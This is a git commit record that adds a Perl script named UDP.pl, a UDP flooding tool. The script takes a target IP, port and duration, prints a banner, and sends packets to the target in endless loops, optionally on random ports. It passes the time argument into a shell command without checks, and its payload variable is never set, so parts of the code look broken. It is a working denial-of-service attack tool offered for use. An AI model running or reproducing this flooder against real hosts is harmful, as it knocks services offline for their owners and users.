ca3d0ce1201d8feb56ffd45d9148d46d7077512d
Puppet00 <55746456+Puppet00@users.noreply.github.com>
2020-04-02 19:08:25 +0300

    Create UDP.pl

---
+++ UDP.pl
@@ -0,0 +1,58 @@
+#!/usr/bin/perl
+
+use Socket;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=3) {
+printf "$0 <ip> <port> <time>\n";
+printf "if arg1/2 =0, randports/continous packets.\n";
+exit(1);
+}
+
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[1];
+$time=$ARGV[2];
+
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+    $iaddr = inet_aton("$ip");
+
+printf "
+##     ## ########  ########  
+##     ## ##     ## ##     ## 
+##     ## ##     ## ##     ## 
+##     ## ##     ## ########  
+##     ## ##     ## ##        
+##     ## ##     ## ##        
+ #######  ########  ##        
+
+Press ConTRoL - C To Stop !!\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 65500) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
